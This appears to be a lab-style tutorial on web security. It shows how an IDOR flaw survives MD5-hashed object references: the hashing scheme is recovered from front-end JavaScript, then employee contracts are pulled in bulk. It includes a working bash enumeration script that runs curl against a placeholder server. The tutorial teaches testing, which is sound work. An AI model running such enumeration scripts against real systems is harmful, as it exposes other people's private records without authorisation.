# Bypassing Encoded References

In the previous section, we saw an IDOR vulnerability using employee UIDs in clear text. Some applications hash or encode object references to make enumeration harder, though exploitation may still be possible.

## Testing the Employee Manager Application

Let's examine the Contracts functionality:

```
http://SERVER_IP:PORT/contracts.php
```

When downloading `Employment_contract.pdf`, the intercepted request shows:

```http
POST /download.php HTTP/1.1
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

The application sends a POST request instead of direct file links. Rather than cleartext UIDs, it uses MD5 hashes—one-way functions that cannot be decoded. However, we can attempt to hash various values (UID, username, filename) to find matches.

Testing our UID:
```bash
echo -n 1 | md5sum
# c4ca4238a0b923820dcc509a6f75849b
```

No match. This appears to be a Secure Direct Object Reference, but there's a critical flaw.

## Function Disclosure

Modern JavaScript frameworks often expose sensitive functions on the front-end. In the source code, the download link calls:

```javascript
javascript:downloadContract('1')
```

Examining the `downloadContract()` function:

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

The hash is calculated by:
1. Base64 encoding the UID: `btoa(uid)`
2. MD5 hashing the result

Testing with UID `1`:
```bash
echo -n 1 | base64 -w 0 | md5sum
# cdd96d3cc73d1dbdaffa03cc6cd7339b
```

Perfect match! We've reversed the hashing technique, converting it to an exploitable IDOR.

## Mass Enumeration

Generate hashes for employees 1-10:

```bash
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

Create an exploitation script:

```bash
#!/bin/bash

for i in {1..10}; do
    hash=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
    curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
done
```

Run the script:
```bash
bash ./exploit.sh
ls -1
```

All employee contracts are now downloaded. By reversing the hashing technique, we've successfully exploited the IDOR vulnerability.
